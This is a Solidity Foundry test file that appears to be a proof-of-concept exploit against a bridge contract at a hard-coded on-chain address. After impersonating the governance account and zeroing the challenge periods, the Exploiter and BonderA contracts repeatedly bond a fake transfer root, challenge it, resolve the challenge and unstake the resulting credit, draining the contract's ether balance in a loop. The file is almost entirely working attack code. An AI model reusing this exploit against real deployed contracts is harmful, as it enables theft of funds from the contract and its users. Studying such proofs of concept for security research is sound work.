// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface B {
    function governance() external view returns (address);
    function setGovernance(address _newGovernance) external;
    function bondTransferRoot(bytes32, uint256, uint256) external;
    function addBonder(address bonder) external;
    function setCrossDomainMessengerWrapper(uint256 chainId, address _crossDomainMessengerWrapper) external;
    function setChallengePeriod(uint256 _challengePeriod) external;
    function setChallengeResolutionPeriod(uint256 _challengeResolutionPeriod) external;
    function setMinTransferRootBondDelay(uint256 _minTransferRootBondDelay) external;
    function challengeTransferBond(bytes32 rootHash, uint256 originalAmount, uint256 destinationChainId) external payable;
    function resolveChallenge(bytes32 rootHash, uint256 originalAmount, uint256 destinationChainId) external;
    function getCredit(address bonder) external view returns (uint256);
    function getDebitAndAdditionalDebit(address bonder) external view returns (uint256);
    function unstake(uint256 amount) external;
}

contract Exploiter { // } is Test {
    B b;
    uint256 ct;

    receive() external payable {

    }
    
    function exploit(uint256 currentTarget) external {
        b = B(0xb8901acB165ed027E32754E0FFe830802919727f);

        // emit log_named_uint("address b", address(b).balance);

        BonderA ba = new BonderA();
        b.addBonder(address(ba));
        ba.stage1(currentTarget * 10 ether);

        b.challengeTransferBond{value: currentTarget * 1 ether}(
            bytes32(0x00), (currentTarget) * 10 ether , 1
        );
        ct = currentTarget;
    }
    function exploit2() external {
        // vm.warp(block.timestamp + 1); //
        b.resolveChallenge(bytes32(0x00), ct * 10 ether, 1);

        uint o = address(b).balance;
        uint c =  b.getCredit(address(this));
        uint d = b.getDebitAndAdditionalDebit(address(this));

        uint k = (c - d);
        if (k > o) {
            k = o;
        }
        b.unstake(k);
    }

}

contract BonderA {
    B b;
    function stage1(uint amount) external {
        b = B(0xb8901acB165ed027E32754E0FFe830802919727f);
        
        b.bondTransferRoot(
            bytes32(0x00),
            1, // chainId
            amount 
        );
    }

}

contract CounterTest is Test {
    B b;
    address user;

    function setUp() public {
        b = B(0xb8901acB165ed027E32754E0FFe830802919727f);
        user = b.governance();
        emit log_named_address("User Address", user);
    }

    function testExploit() public {
        Exploiter e = new Exploiter();
        vm.startPrank(user);
        b.setChallengePeriod(0);
        b.setChallengeResolutionPeriod(0);
        b.setMinTransferRootBondDelay(0);
        
        b.setGovernance(address(e));
        vm.stopPrank();

        address(e).call{value: 800 ether}(hex"");

        for (uint i=0; i<10; i++) {
            uint xx = address(e).balance;
            xx /= 10;
            xx *= 10;
            e.exploit(xx /= 1 ether);
            vm.warp(block.timestamp + 1);
            e.exploit2();
            vm.warp(block.timestamp + 1);
            emit log_named_uint("e", address(e).balance);
        }
    }

}
